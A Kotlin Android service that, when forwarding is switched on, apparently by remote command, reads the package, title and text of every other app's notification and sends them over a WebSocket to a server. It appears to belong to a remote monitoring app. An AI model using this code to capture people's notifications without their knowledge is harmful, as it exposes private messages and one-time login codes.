package com.kashem.shaikh.services

import android.app.Notification
import android.content.Context
import android.provider.Settings
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import org.json.JSONObject

class NotificationListener : NotificationListenerService() {

    companion object {
        @Volatile private var instance: NotificationListener? = null
        @Volatile private var forwardEnabled = false

        fun isConnected(): Boolean = instance != null
        fun isForwarding(): Boolean = forwardEnabled

        fun isPermissionGranted(context: Context): Boolean {
            val flat = Settings.Secure.getString(
                context.contentResolver,
                "enabled_notification_listeners"
            ) ?: return false
            return flat.contains(context.packageName)
        }

        fun startForwarding(): String {
            if (instance == null) {
                return "ERROR: Notification listener not enabled in Settings"
            }
            forwardEnabled = true
            AppLogs.info("NotificationListener: forwarding ON")
            return "SUCCESS: Notification forwarding ON"
        }

        fun stopForwarding(): String {
            forwardEnabled = false
            AppLogs.info("NotificationListener: forwarding OFF")
            return "SUCCESS: Notification forwarding OFF"
        }
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
        // ✅ FIX: System-bound service — FGS-এর আগেও start হতে পারে, তাই AppLogs init নিশ্চিত
        AppLogs.init(applicationContext)
        instance = this
        AppLogs.info("NotificationListener: connected")
    }

    override fun onListenerDisconnected() {
        instance = null
        AppLogs.info("NotificationListener: disconnected")
        super.onListenerDisconnected()
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn == null || !forwardEnabled) return
        try {
            val extras = sbn.notification?.extras ?: return
            val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
            val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
            val pkg = sbn.packageName ?: ""
            val ts = sbn.postTime

            if (pkg == applicationContext.packageName) return

            val json = JSONObject().apply {
                put("type", "notification")
                put("pkg", pkg)
                put("title", title)
                put("text", text)
                put("ts", ts)
            }
            WebSocketClient.sendRaw(json.toString())
            AppLogs.debug("NotificationListener: [$pkg] $title – $text")
        } catch (e: Exception) {
            AppLogs.error("onNotificationPosted failed", e)
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) { /* ignore */ }
}